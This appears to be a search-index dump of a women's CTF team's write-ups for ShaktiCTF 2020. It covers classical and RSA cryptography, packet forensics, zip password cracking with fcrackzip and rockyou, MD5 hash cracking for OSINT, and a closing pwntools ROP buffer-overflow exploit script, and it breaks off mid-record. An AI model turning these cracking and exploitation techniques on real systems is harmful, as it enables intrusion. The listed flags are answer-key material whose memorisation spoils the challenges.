{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to TeamShakti Writeups Introduction This site is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"Welcome to TeamShakti Writeups"},{"location":"#welcome-to-teamshakti-writeups","text":"","title":"Welcome to TeamShakti Writeups"},{"location":"#introduction","text":"This site is hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus .","title":"Introduction"},{"location":"#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensic Analysis Miscellaneous","title":"The contents of this repo"},{"location":"about/","text":"About Us Team Shakti was formed in 2018 when a bunch of passion driven girls from Amria School of Engineering with a vision and a passion driven mentor decided to ' Hack the Stereotypes ', building the country's first women only Capture The Flag team. Mr.Vipin Pavithran had already established a few among the country\u2019s leading student clubs: amFOSS , the student developer\u2019s hub and bi0s , the hackers\u2019 den. There is inadequate representation of women in the field of cybersecurity and TeamShakti was the spark of change. The beginning is always the hardest, and the team had to face its fair share of struggles trying to establish themselves. Due to the efforts of the team and the mentors, the club flourished. Here at TeamShakti, we strive to learn and teach others what we have learnt and that goal fuels our events - ShaktiCTF and ShaktiCon . Team Shakti is characterised by its peer mentoring and the bond of sisterhood that teammates share with each other. Newbies are introduced into the field by the experienced seniors. Overall, we are a group of motivated women who would support and encourage each other while venturing into the cyber world to the best of our possibilities and try to bring about the difference we hope to see in the tech industry where women are highly underpresented. Join Us @ Discord Follow us on Twitter - @TeamShakti Contact Us via mail : shakticon@am.amrita.edu Members @ geethna @ Ashwati Sasi @ sowmya @ Sruthi Dixit @ Ayushi Sharma @ Nimisha Dulgalya @ ph03n1x @ sandrabeme @ Sridevi K @ Namitha S @ Simran Kathpalia @ av4nth1ka @ k1n0r4 @ L0xm1","title":"About Us"},{"location":"about/#about-us","text":"Team Shakti was formed in 2018 when a bunch of passion driven girls from Amria School of Engineering with a vision and a passion driven mentor decided to ' Hack the Stereotypes ', building the country's first women only Capture The Flag team. Mr.Vipin Pavithran had already established a few among the country\u2019s leading student clubs: amFOSS , the student developer\u2019s hub and bi0s , the hackers\u2019 den. There is inadequate representation of women in the field of cybersecurity and TeamShakti was the spark of change. The beginning is always the hardest, and the team had to face its fair share of struggles trying to establish themselves. Due to the efforts of the team and the mentors, the club flourished. Here at TeamShakti, we strive to learn and teach others what we have learnt and that goal fuels our events - ShaktiCTF and ShaktiCon . Team Shakti is characterised by its peer mentoring and the bond of sisterhood that teammates share with each other. Newbies are introduced into the field by the experienced seniors. Overall, we are a group of motivated women who would support and encourage each other while venturing into the cyber world to the best of our possibilities and try to bring about the difference we hope to see in the tech industry where women are highly underpresented. Join Us @ Discord Follow us on Twitter - @TeamShakti Contact Us via mail : shakticon@am.amrita.edu","title":"About Us"},{"location":"about/#members","text":"@ geethna @ Ashwati Sasi @ sowmya @ Sruthi Dixit @ Ayushi Sharma @ Nimisha Dulgalya @ ph03n1x @ sandrabeme @ Sridevi K @ Namitha S @ Simran Kathpalia @ av4nth1ka @ k1n0r4 @ L0xm1","title":"Members"},{"location":"shaktictf/","text":"Welcome to ShaktiCTF Writeups Introduction ShaktiCTF is a women-only CTF hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . Bringing participants from five major continents(Asia, Europe, Africa, North and South America), the competition aimed to balance the existing gender gap in the field of cybersecurity by hosting a beginner friendly CTF on a women only playground and bringing more feminine power into the field. The contents of this repo This repo contains the writeups of various challenges from ShaktiCTF. ShaktiCTF 2024 Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics OSINT ShaktiCTF 2022 Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics Misc ShaktiCTF 2021 Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics Misc ShaktiCTF 2020 Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics steganography Miscellaneous","title":"ShaktiCTF"},{"location":"shaktictf/#welcome-to-shaktictf-writeups","text":"","title":"Welcome to ShaktiCTF Writeups"},{"location":"shaktictf/#introduction","text":"ShaktiCTF is a women-only CTF hosted by TeamShakti , the women-only CTF team of Amrita Vishwa Vidyapeetham, Amritapuri Campus . Bringing participants from five major continents(Asia, Europe, Africa, North and South America), the competition aimed to balance the existing gender gap in the field of cybersecurity by hosting a beginner friendly CTF on a women only playground and bringing more feminine power into the field.","title":"Introduction"},{"location":"shaktictf/#the-contents-of-this-repo","text":"This repo contains the writeups of various challenges from ShaktiCTF.","title":"The contents of this repo"},{"location":"shaktictf/#shaktictf-2024","text":"Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics OSINT","title":"ShaktiCTF 2024"},{"location":"shaktictf/#shaktictf-2022","text":"Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics Misc","title":"ShaktiCTF 2022"},{"location":"shaktictf/#shaktictf-2021","text":"Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics Misc","title":"ShaktiCTF 2021"},{"location":"shaktictf/#shaktictf-2020","text":"Reverse Engineering Binary Exploitation Cryptography Web Exploitation Forensics steganography Miscellaneous","title":"ShaktiCTF 2020"},{"location":"ShaktiCTF20/crypto/3-2-1Go/","text":"3,2,1..Go! Author : ph03n1x Description Introducing our theme woman : \"Joan Clarke!\" Cipher : WEQEXFTUXQHVOUFPSVLPTORHAFBQE Looks like I found something I shouldn't have. Seperate the words by underscores('_ Short Writeup Configurations of enigma given. Online solver : https://www.dcode.fr/enigma-machine-cipher Flag : shaktictf{you_have_cracked_the_enigma_genius}","title":"3,2,1..Go!"},{"location":"ShaktiCTF20/crypto/3-2-1Go/#321go","text":"","title":"3,2,1..Go!"},{"location":"ShaktiCTF20/crypto/3-2-1Go/#author-ph03n1x","text":"","title":"Author : ph03n1x"},{"location":"ShaktiCTF20/crypto/3-2-1Go/#description","text":"Introducing our theme woman : \"Joan Clarke!\" Cipher : WEQEXFTUXQHVOUFPSVLPTORHAFBQE Looks like I found something I shouldn't have. Seperate the words by underscores('_","title":"Description"},{"location":"ShaktiCTF20/crypto/3-2-1Go/#short-writeup","text":"Configurations of enigma given. Online solver : https://www.dcode.fr/enigma-machine-cipher Flag : shaktictf{you_have_cracked_the_enigma_genius}","title":"Short Writeup"},{"location":"ShaktiCTF20/crypto/AncientWarfare/","text":"Ancient Warfare Author : ph03n1x Description Do you know how people from Caeser's time used to send encrypted messages? Try to get the flag : funxgvpgs{byq3e_1f_a0g_nyj4lf_gu3_o3gg3e!} Short Writeup Caser's cipher with key of 13 Flag : shaktictf{old3r_1s_n0t_alw4ys_th3_b3tt3r!}","title":"Ancient Warfare"},{"location":"ShaktiCTF20/crypto/AncientWarfare/#ancient-warfare","text":"","title":"Ancient Warfare"},{"location":"ShaktiCTF20/crypto/AncientWarfare/#author-ph03n1x","text":"","title":"Author : ph03n1x"},{"location":"ShaktiCTF20/crypto/AncientWarfare/#description","text":"Do you know how people from Caeser's time used to send encrypted messages? Try to get the flag : funxgvpgs{byq3e_1f_a0g_nyj4lf_gu3_o3gg3e!}","title":"Description"},{"location":"ShaktiCTF20/crypto/AncientWarfare/#short-writeup","text":"Caser's cipher with key of 13 Flag : shaktictf{old3r_1s_n0t_alw4ys_th3_b3tt3r!}","title":"Short Writeup"},{"location":"ShaktiCTF20/crypto/Easyncoding/","text":"Easyncodings Challenge Description Joan feels this text is unbreakable. Prove her wrong by decoding this. 01001110 01111010 01001101 00110010 01001111 01000100 01011001 01111000 01001110 01101101 01001001 00110011 01001110 01000100 01011001 00110101 01001110 01101010 01001101 00110011 01001110 01000100 01011001 00110010 01001110 00110010 01001001 00110001 01001110 01111010 01001101 00110000 01001110 01111010 01001001 00110010 01011010 01000100 01010101 00110001 01001110 01111010 01000001 00110001 01011010 01101010 01010001 01111010 01001110 01101010 01100111 01111010 01001110 01000100 01011010 01101010 01001110 01101101 01001101 01111010 01001101 01111010 01011010 01101100 01001110 01101010 01100011 01111010 01001101 01111010 01100100 01101011 Short writeup Binary decode, Base64 decode, Hex decode Challenge Author 4lph4 Flag shaktictf{W4rmUp_Ch4ll3ng3}","title":"Easyncodings"},{"location":"ShaktiCTF20/crypto/Easyncoding/#easyncodings","text":"","title":"Easyncodings"},{"location":"ShaktiCTF20/crypto/Easyncoding/#challenge-description","text":"Joan feels this text is unbreakable. Prove her wrong by decoding this. 01001110 01111010 01001101 00110010 01001111 01000100 01011001 01111000 01001110 01101101 01001001 00110011 01001110 01000100 01011001 00110101 01001110 01101010 01001101 00110011 01001110 01000100 01011001 00110010 01001110 00110010 01001001 00110001 01001110 01111010 01001101 00110000 01001110 01111010 01001001 00110010 01011010 01000100 01010101 00110001 01001110 01111010 01000001 00110001 01011010 01101010 01010001 01111010 01001110 01101010 01100111 01111010 01001110 01000100 01011010 01101010 01001110 01101101 01001101 01111010 01001101 01111010 01011010 01101100 01001110 01101010 01100011 01111010 01001101 01111010 01100100 01101011","title":"Challenge Description"},{"location":"ShaktiCTF20/crypto/Easyncoding/#short-writeup","text":"Binary decode, Base64 decode, Hex decode","title":"Short writeup"},{"location":"ShaktiCTF20/crypto/Easyncoding/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/crypto/Easyncoding/#flag","text":"shaktictf{W4rmUp_Ch4ll3ng3}","title":"Flag"},{"location":"ShaktiCTF20/crypto/Magic/","text":"Magic Author : ph03n1x Description Sometimes you have to believe in the Magic within you. \u201cI know it's not ordinary. But who ever loved ordinary?\u201d -- Joan Clarke Short Writeup xor with file signature' key = \"w0m3n_p0w3r\" Flag : shaktictf{x0r_aint_secure_if_its_too_short}","title":"Magic"},{"location":"ShaktiCTF20/crypto/Magic/#magic","text":"","title":"Magic"},{"location":"ShaktiCTF20/crypto/Magic/#author-ph03n1x","text":"","title":"Author : ph03n1x"},{"location":"ShaktiCTF20/crypto/Magic/#description","text":"Sometimes you have to believe in the Magic within you. \u201cI know it's not ordinary. But who ever loved ordinary?\u201d -- Joan Clarke","title":"Description"},{"location":"ShaktiCTF20/crypto/Magic/#short-writeup","text":"xor with file signature' key = \"w0m3n_p0w3r\" Flag : shaktictf{x0r_aint_secure_if_its_too_short}","title":"Short Writeup"},{"location":"ShaktiCTF20/crypto/RailMail/","text":"RailMail Challenge Description Joan received a secret mail from her friend, upon looking into it, she found that it contains an encrypted text and sum of key and offset. She is clueless what to do. Help her get the message. Short writeup Challenge based on RailFence cipher. Sum of key and offset is given. Simple bruteforce needs to be done to get actual key and offset. Online tools can be used to solve the same. Challenge Author 4lph4 Flag shaktictf{Aw3s0m3_k33p_Go1n9!}","title":"RailMail"},{"location":"ShaktiCTF20/crypto/RailMail/#railmail","text":"","title":"RailMail"},{"location":"ShaktiCTF20/crypto/RailMail/#challenge-description","text":"Joan received a secret mail from her friend, upon looking into it, she found that it contains an encrypted text and sum of key and offset. She is clueless what to do. Help her get the message.","title":"Challenge Description"},{"location":"ShaktiCTF20/crypto/RailMail/#short-writeup","text":"Challenge based on RailFence cipher. Sum of key and offset is given. Simple bruteforce needs to be done to get actual key and offset. Online tools can be used to solve the same.","title":"Short writeup"},{"location":"ShaktiCTF20/crypto/RailMail/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/crypto/RailMail/#flag","text":"shaktictf{Aw3s0m3_k33p_Go1n9!}","title":"Flag"},{"location":"ShaktiCTF20/crypto/SimpleHash/","text":"SimpleHash Challenge Description The 'Government Code and Cypher School' was founded with a single purpose: that of breaking the German Enigma Code, which they thought to be non-reversible. But later it was broken by her and her team. Hashes are said to be reversible too. Do you think you can reverse this hash though? Short writeup Perform bruteforce attack to get the flag. Length of the flag is only 5 characters, making it easy to brute force. import string import hashlib x = \"cb7a53dd721f4ca90b8fd3dbdabeda5a\".decode(\"hex\") chars = list(string.ascii_lowercase + string.digits) for i in chars: for j in chars: for k in chars: for a in chars: for b in chars: m = hashlib.md5() m.update(\"shaktictf{\" + i+j+k+a+b + \"}\") if m.digest() == x: print \"shaktictf{\" + i+j+k+a+b + \"}\" break Challenge Author 4lph4 Flag shaktictf{sup3r}","title":"SimpleHash"},{"location":"ShaktiCTF20/crypto/SimpleHash/#simplehash","text":"","title":"SimpleHash"},{"location":"ShaktiCTF20/crypto/SimpleHash/#challenge-description","text":"The 'Government Code and Cypher School' was founded with a single purpose: that of breaking the German Enigma Code, which they thought to be non-reversible. But later it was broken by her and her team. Hashes are said to be reversible too. Do you think you can reverse this hash though?","title":"Challenge Description"},{"location":"ShaktiCTF20/crypto/SimpleHash/#short-writeup","text":"Perform bruteforce attack to get the flag. Length of the flag is only 5 characters, making it easy to brute force. import string import hashlib x = \"cb7a53dd721f4ca90b8fd3dbdabeda5a\".decode(\"hex\") chars = list(string.ascii_lowercase + string.digits) for i in chars: for j in chars: for k in chars: for a in chars: for b in chars: m = hashlib.md5() m.update(\"shaktictf{\" + i+j+k+a+b + \"}\") if m.digest() == x: print \"shaktictf{\" + i+j+k+a+b + \"}\" break","title":"Short writeup"},{"location":"ShaktiCTF20/crypto/SimpleHash/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/crypto/SimpleHash/#flag","text":"shaktictf{sup3r}","title":"Flag"},{"location":"ShaktiCTF20/crypto/SimpleRSA/","text":"SimpleRSA Challenge Description Here's the secret message from Joan to you. Break it and Read it. Short writeup Factordb helps in breaking the modulus. Online tools or code can be written to do RSA decryption. from Crypto.Util.number import * # Use an online tool to factorise n. eg: factordb.com p = 724804277 q = 9413710946631053481929229233058876904137902588796220199578081215560027062585806165966619995720300336586922201502376869335302844207978432570013597781850093 #n == p*q c = 484661494807973176484841550022162356056969394230726278907827156279573785417739620605749085238379352332325669223692676583758711843467179784519220209212809010990483 e = 65537 d = inverse(e,(p-1)*(q-1)) m = pow(c,d,p*q) print(long_to_bytes(m)) Challenge Author 4lph4 Flag shaktictf{Gr3a7-g01ng-g1rl-Y4yyy!!}","title":"SimpleRSA"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#simplersa","text":"","title":"SimpleRSA"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#challenge-description","text":"Here's the secret message from Joan to you. Break it and Read it.","title":"Challenge Description"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#short-writeup","text":"Factordb helps in breaking the modulus. Online tools or code can be written to do RSA decryption. from Crypto.Util.number import * # Use an online tool to factorise n. eg: factordb.com p = 724804277 q = 9413710946631053481929229233058876904137902588796220199578081215560027062585806165966619995720300336586922201502376869335302844207978432570013597781850093 #n == p*q c = 484661494807973176484841550022162356056969394230726278907827156279573785417739620605749085238379352332325669223692676583758711843467179784519220209212809010990483 e = 65537 d = inverse(e,(p-1)*(q-1)) m = pow(c,d,p*q) print(long_to_bytes(m))","title":"Short writeup"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/crypto/SimpleRSA/#flag","text":"shaktictf{Gr3a7-g01ng-g1rl-Y4yyy!!}","title":"Flag"},{"location":"ShaktiCTF20/crypto/XOR/","text":"XOR is Easy Author : ph03n1x Description Joan worked at Bletchley Park in the section known as Hut 8 and quickly became the only female practitioner of Banburismus, a cryptanalytic process developed by Alan Turing to break German ciphers. He came up with the idea when he noticed that every german message ended up with the same word \u201cHeil Hitler!\u201d . In other words the ciphertexts though different, they definitely knew that every text would end with the same plaintext Can you use the analogy to get the flag here? Short Writeup Xoring with known plaintext. Brute forcing one character Flag : shaktictf{X0r_c4n_b3_a_sh4dy_s0m3t1m3s!}","title":"XOR is Easy"},{"location":"ShaktiCTF20/crypto/XOR/#xor-is-easy","text":"","title":"XOR is Easy"},{"location":"ShaktiCTF20/crypto/XOR/#author-ph03n1x","text":"","title":"Author : ph03n1x"},{"location":"ShaktiCTF20/crypto/XOR/#description","text":"Joan worked at Bletchley Park in the section known as Hut 8 and quickly became the only female practitioner of Banburismus, a cryptanalytic process developed by Alan Turing to break German ciphers. He came up with the idea when he noticed that every german message ended up with the same word \u201cHeil Hitler!\u201d . In other words the ciphertexts though different, they definitely knew that every text would end with the same plaintext Can you use the analogy to get the flag here?","title":"Description"},{"location":"ShaktiCTF20/crypto/XOR/#short-writeup","text":"Xoring with known plaintext. Brute forcing one character Flag : shaktictf{X0r_c4n_b3_a_sh4dy_s0m3t1m3s!}","title":"Short Writeup"},{"location":"ShaktiCTF20/crypto/intro/","text":"Cryptography Challenge Name Level Author Concept 3,2,1..Go Easy ph03n1x Enigma Ancient Warfare Easy ph03n1x Caeser Cipher Easyncoding Easy ph03n1x Base Encoding Rail Mail Medium 4lph4 Rail Cipher Magic Medium ph03n1x Xor SimpleRSA Medium 4lph4 RSA factorisation SimpleHash Medium 4lph4 Bruteforce Hash XOR Hard 4lph4 XOR","title":"Cryptography"},{"location":"ShaktiCTF20/crypto/intro/#cryptography","text":"Challenge Name Level Author Concept 3,2,1..Go Easy ph03n1x Enigma Ancient Warfare Easy ph03n1x Caeser Cipher Easyncoding Easy ph03n1x Base Encoding Rail Mail Medium 4lph4 Rail Cipher Magic Medium ph03n1x Xor SimpleRSA Medium 4lph4 RSA factorisation SimpleHash Medium 4lph4 Bruteforce Hash XOR Hard 4lph4 XOR","title":"Cryptography"},{"location":"ShaktiCTF20/forensics/Extract_m3/","text":"Extract M3 Challenge Description We got a clue for a pending criminal case but seems like there was a secret exchange of information among the suspects. Can you help us find what they were sharing so that we can punish the criminals? Short writeup Extract the data from TCP packets where the length of bytes is more than 900 and save it as a new pcapng file. Use scapy to extract the jpg image data from the new pcapng file. from scapy.all import * r=rdpcap('newfile.pcapng') s='' for i in r: s+=i.load open('image.jpg','w').write(s) Extract the zip file using binwalk which is password protected. Use fcrackzip and rockyou.txt to find out the password and open the pdf file. Select the entire file and change the text colour to black to view the flag. Challenge Author v1Ru5 Flag shaktictf{h0p3_y0u_ar3_enj0ying_thi5}","title":"Extract M3"},{"location":"ShaktiCTF20/forensics/Extract_m3/#extract-m3","text":"","title":"Extract M3"},{"location":"ShaktiCTF20/forensics/Extract_m3/#challenge-description","text":"We got a clue for a pending criminal case but seems like there was a secret exchange of information among the suspects. Can you help us find what they were sharing so that we can punish the criminals?","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/Extract_m3/#short-writeup","text":"Extract the data from TCP packets where the length of bytes is more than 900 and save it as a new pcapng file. Use scapy to extract the jpg image data from the new pcapng file. from scapy.all import * r=rdpcap('newfile.pcapng') s='' for i in r: s+=i.load open('image.jpg','w').write(s) Extract the zip file using binwalk which is password protected. Use fcrackzip and rockyou.txt to find out the password and open the pdf file. Select the entire file and change the text colour to black to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/forensics/Extract_m3/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/forensics/Extract_m3/#flag","text":"shaktictf{h0p3_y0u_ar3_enj0ying_thi5}","title":"Flag"},{"location":"ShaktiCTF20/forensics/Not_that_easy/","text":"Not That Easy Challenge Description We have intercepted the communication between two criminals and we found that they had shared a secret information. Can you find out the secret? Short writeup There are a set of TCP packets with some data present in their buffer that eventually leads us to the wrong flag. The packet with size 521 bytes begins with file signature -> 89 50 4e 47 0d 0a....which is a PNG image. Extract the image and use zbarimg to view the flag. Challenge Author v1Ru5 Flag shaktictf{sh3_w4s_h0n0r3d_by_3lectr0nic_fr0nti3r_f0und4ti0n}","title":"Not That Easy"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#not-that-easy","text":"","title":"Not That Easy"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#challenge-description","text":"We have intercepted the communication between two criminals and we found that they had shared a secret information. Can you find out the secret?","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#short-writeup","text":"There are a set of TCP packets with some data present in their buffer that eventually leads us to the wrong flag. The packet with size 521 bytes begins with file signature -> 89 50 4e 47 0d 0a....which is a PNG image. Extract the image and use zbarimg to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/forensics/Not_that_easy/#flag","text":"shaktictf{sh3_w4s_h0n0r3d_by_3lectr0nic_fr0nti3r_f0und4ti0n}","title":"Flag"},{"location":"ShaktiCTF20/forensics/intro/","text":"Forensics Challenge Name Level Author Concept Shark on wire Very Easy v1Ru5 network,wireshark zip zap zoo Easy v1Ru5 zip,file forensics Not that easy Medium v1Ru5 network,wireshark Extract M3 Hard v1Ru5 network,wireshark,scapy","title":"Forensics"},{"location":"ShaktiCTF20/forensics/intro/#forensics","text":"Challenge Name Level Author Concept Shark on wire Very Easy v1Ru5 network,wireshark zip zap zoo Easy v1Ru5 zip,file forensics Not that easy Medium v1Ru5 network,wireshark Extract M3 Hard v1Ru5 network,wireshark,scapy","title":"Forensics"},{"location":"ShaktiCTF20/forensics/shark_on_wire/","text":"Shark on Wire Challenge Description Lara sent me a file which had some hidden message. Help me recover the secret information. Short writeup Follow the TCP stream to see the flag. Challenge Author v1Ru5 Flag shaktictf{wir3sh4rk_i5_ju5t_aw3s0m3}","title":"Shark on Wire"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#shark-on-wire","text":"","title":"Shark on Wire"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#challenge-description","text":"Lara sent me a file which had some hidden message. Help me recover the secret information.","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#short-writeup","text":"Follow the TCP stream to see the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/forensics/shark_on_wire/#flag","text":"shaktictf{wir3sh4rk_i5_ju5t_aw3s0m3}","title":"Flag"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/","text":"Zip Zap Zoo File Forensics Author : v1Ru5 Challenge Description We have hidden an important information for you in this file. But remember, it's not always about bruteforcing... Short writeup: Perform 'unzip challenge.zip' to see the password \"h4ckTh35t3R30tyP35\". Extract file.zip and correct the header of the zip file. Open flag.txt using the password and decode the data using any base32 decoder. flag : shaktictf{y4yYYyyY!_Y0u_g0t_1t_409515398}","title":"Zip Zap Zoo"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#zip-zap-zoo","text":"","title":"Zip Zap Zoo"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#file-forensics","text":"Author : v1Ru5","title":"File Forensics"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#challenge-description","text":"We have hidden an important information for you in this file. But remember, it's not always about bruteforcing...","title":"Challenge Description"},{"location":"ShaktiCTF20/forensics/zip_zap_zoo/#short-writeup","text":"Perform 'unzip challenge.zip' to see the password \"h4ckTh35t3R30tyP35\". Extract file.zip and correct the header of the zip file. Open flag.txt using the password and decode the data using any base32 decoder. flag : shaktictf{y4yYYyyY!_Y0u_g0t_1t_409515398}","title":"Short writeup:"},{"location":"ShaktiCTF20/misc/10010101/","text":"10010101 Misc Author : v1Ru5 Challenge Description The story of initial six programmers is not over with them. They are going to recruit a team of fifty scientists to continue working on ENIAC. There are several spots for all of us and for that we need to solve this puzzle.I tried most of the conversions, but this seems to be a different language. I think the text file has something to do with the password of the zip file. Short writeup: Use any online SPOON language decoder to get the password to open the zip file. flag : shaktictf{yEsSsSssssSSS...Sp0oNNn!}","title":"10010101"},{"location":"ShaktiCTF20/misc/10010101/#10010101","text":"","title":"10010101"},{"location":"ShaktiCTF20/misc/10010101/#misc","text":"Author : v1Ru5","title":"Misc"},{"location":"ShaktiCTF20/misc/10010101/#challenge-description","text":"The story of initial six programmers is not over with them. They are going to recruit a team of fifty scientists to continue working on ENIAC. There are several spots for all of us and for that we need to solve this puzzle.I tried most of the conversions, but this seems to be a different language. I think the text file has something to do with the password of the zip file.","title":"Challenge Description"},{"location":"ShaktiCTF20/misc/10010101/#short-writeup","text":"Use any online SPOON language decoder to get the password to open the zip file. flag : shaktictf{yEsSsSssssSSS...Sp0oNNn!}","title":"Short writeup:"},{"location":"ShaktiCTF20/misc/FindMe/","text":"Findme Challenge Description OSINT is popular these days. Kay hid your flag in a social networking website. Go get your flag. Writeup We have a file attached along with the challenge description. On opening the file we see the following: Username: (2c1743a391305fbf367df8e4f069f9f9) + \"x86\" + (987bcab01b929eb2c07877b224215c92) Username didn't work? Try and try. But don't come and \"bash\" me. Description and the contents in the file suggest that the flag has something to do with social networking website. But using the username as it is won't work as the first and last parts are MD5 hashes of the username. The word \"bash\" was simply used to hint that it's a \"hash\". Online tools like crackstation can be used to crack the hashes. Upon cracking the hashes we get words alpha and beta Joining them accordingly gives the username as: alphax86beta Next part is finding the social networking site used. Here's where the description comes into use. Online OSINT tools can be used to find the social networking websites where an user account with the given username exists. namecheckr gives websites with the given username. There are many social networking websites where an user account with the given username exists but Tumblr is the right one. Flag can be found in the description part. Flag shaktictf{H3y!!!0s1nt_pr0} Challenge Author 4lph4","title":"Findme"},{"location":"ShaktiCTF20/misc/FindMe/#findme","text":"","title":"Findme"},{"location":"ShaktiCTF20/misc/FindMe/#challenge-description","text":"OSINT is popular these days. Kay hid your flag in a social networking website. Go get your flag.","title":"Challenge Description"},{"location":"ShaktiCTF20/misc/FindMe/#writeup","text":"We have a file attached along with the challenge description. On opening the file we see the following: Username: (2c1743a391305fbf367df8e4f069f9f9) + \"x86\" + (987bcab01b929eb2c07877b224215c92) Username didn't work? Try and try. But don't come and \"bash\" me. Description and the contents in the file suggest that the flag has something to do with social networking website. But using the username as it is won't work as the first and last parts are MD5 hashes of the username. The word \"bash\" was simply used to hint that it's a \"hash\". Online tools like crackstation can be used to crack the hashes. Upon cracking the hashes we get words alpha and beta Joining them accordingly gives the username as: alphax86beta Next part is finding the social networking site used. Here's where the description comes into use. Online OSINT tools can be used to find the social networking websites where an user account with the given username exists. namecheckr gives websites with the given username. There are many social networking websites where an user account with the given username exists but Tumblr is the right one. Flag can be found in the description part.","title":"Writeup"},{"location":"ShaktiCTF20/misc/FindMe/#flag","text":"shaktictf{H3y!!!0s1nt_pr0}","title":"Flag"},{"location":"ShaktiCTF20/misc/FindMe/#challenge-author","text":"4lph4","title":"Challenge Author"},{"location":"ShaktiCTF20/misc/Wooooww/","text":"Wooooww Misc Author : v1Ru5 Challenge Description Some terrorists implanted a spy microphone in our office and tried sending some important project details to their country. The ENIAC programmers caught that and we need your help to extract the secret message. Flag format : shaktictf{STRING} Short writeup: Ignore other tones and decode the morse part of the mp3 file to get the flag. flag : shaktictf{LOLM0RS3I5FUNN}","title":"Wooooww"},{"location":"ShaktiCTF20/misc/Wooooww/#wooooww","text":"","title":"Wooooww"},{"location":"ShaktiCTF20/misc/Wooooww/#misc","text":"Author : v1Ru5","title":"Misc"},{"location":"ShaktiCTF20/misc/Wooooww/#challenge-description","text":"Some terrorists implanted a spy microphone in our office and tried sending some important project details to their country. The ENIAC programmers caught that and we need your help to extract the secret message. Flag format : shaktictf{STRING}","title":"Challenge Description"},{"location":"ShaktiCTF20/misc/Wooooww/#short-writeup","text":"Ignore other tones and decode the morse part of the mp3 file to get the flag. flag : shaktictf{LOLM0RS3I5FUNN}","title":"Short writeup:"},{"location":"ShaktiCTF20/misc/emojicode/","text":"Emoji-gram Writeup The idea of this challenge was to make you write a small python program that could decode the encrypted emoji encoded text Script import emojicode emojicode.decrypt('[THE EMOJI STRING]')","title":"Emoji-gram"},{"location":"ShaktiCTF20/misc/emojicode/#emoji-gram","text":"","title":"Emoji-gram"},{"location":"ShaktiCTF20/misc/emojicode/#writeup","text":"The idea of this challenge was to make you write a small python program that could decode the encrypted emoji encoded text","title":"Writeup"},{"location":"ShaktiCTF20/misc/emojicode/#script","text":"import emojicode emojicode.decrypt('[THE EMOJI STRING]')","title":"Script"},{"location":"ShaktiCTF20/misc/intro/","text":"Misc Challenge Name Level Author Concept Emojicode Easy 4lex1 misc Wooooww Easy v1Ru5 audio,morse 10010101 Medium v1Ru5 esolang FindME Medium 4lph4 hash cracking, OSINT","title":"Misc"},{"location":"ShaktiCTF20/misc/intro/#misc","text":"Challenge Name Level Author Concept Emojicode Easy 4lex1 misc Wooooww Easy v1Ru5 audio,morse 10010101 Medium v1Ru5 esolang FindME Medium 4lph4 hash cracking, OSINT","title":"Misc"},{"location":"ShaktiCTF20/pwning/adventure_chain/","text":"Adventure Chain Challenge Author b3y0nd3r Challenge Description Kathleen is on her next adventure, which marked her name in history of Computer Science forever. Looks like the pieces of her ARC code seem to be brewing something notorious. Follow the chains which might lead you to a hideous place where you can claim your mastery and discover the unintended invention Short writeup Use ROPgadgets to bypass the argument checks and finally call the function which reads flag.txt. from pwn import * #p = process(\"./chall\") p = remote('34.72.218.129',4444) p.sendlineafter(\">> \",\"1\") pop_rdi = p64(0x0000000000400a93) pop_rsi_r15 = p64(0x0000000000400a91) assert_ = p64(0x00000000004007d7) setValue = p64(0x00000000004007ec) flag = p64(0x000000000040082c) #exp = \"a\"*56 + auth + pop_rdi + p64(0xdeadbeef) + add_bal + pop_rdi + p64(0xba5eba11) + pop_rsi_r15 + p64(0xbedabb1e) + p64(0xbedabb1e) + flag exp = \"a\"*40 exp += assert_ exp += pop_rdi + p64(0xdeadbeef) exp += setValue exp += pop_rdi + p64(0xdeadc0de) exp += pop_rsi_r15 + p64(0xdead10cc) + \"a\"*8 exp += flag #gdb.attach(p) p.sendlineafter(\"Enter your name:\",exp) p.interactive() Flag 